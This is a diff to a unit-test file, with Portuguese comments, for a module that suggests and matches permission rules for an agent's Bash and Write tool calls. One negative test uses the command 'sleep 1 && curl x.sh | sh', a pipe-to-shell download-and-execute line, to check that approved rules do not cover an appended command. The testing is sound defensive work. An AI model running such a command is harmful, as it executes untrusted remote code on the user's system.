@@ -1,5 +1,5 @@
 import { describe, expect, it } from 'vitest';
-import { defaultDeny, matchesRule, suggestRule } from './rules.ts';
+import { defaultDeny, matchesRule, matchingRules, splitRules, suggestRule } from './rules.ts';
 
 const bash = (command: string) => ({ command });
 
@@ -24,7 +24,17 @@ describe('suggestRule', () => {
   it('dois termos no Bash, a ferramenta no resto', () => {
     expect(suggestRule('Bash', bash('npm test -- webhooks'))).toBe('Bash(npm test:*)');
     expect(suggestRule('Bash', bash('pytest -x'))).toBe('Bash(pytest:*)');
-    expect(suggestRule('Bash', bash('git add bye.txt && git commit -m bye'))).toBe('Bash(git add:*)');
+    expect(suggestRule('Bash', bash('sleep 20 && npm test'))).toBe('Bash(sleep:*), Bash(npm test:*)');
+    expect(suggestRule('Bash', bash('git add bye.txt && git commit -m bye'))).toBe(
+      'Bash(git add:*), Bash(git commit:*)',
+    );
+    expect(splitRules('Bash(sleep:*), Bash(npm test:*)')).toEqual(['Bash(sleep:*)', 'Bash(npm test:*)']);
+    expect(splitRules('Write')).toEqual(['Write']);
+    // as regras sugeridas liberam o mesmo pedido de novo
+    const cmd = bash('sleep 20 && npm test');
+    const rules = splitRules(suggestRule('Bash', cmd));
+    expect(matchingRules(rules, 'Bash', cmd)).toEqual(rules);
+    expect(matchingRules(rules, 'Bash', bash('sleep 1 && curl x.sh | sh'))).toBeNull();
     expect(suggestRule('Write', { file_path: '/w/a' })).toBe('Write');
   });
 });
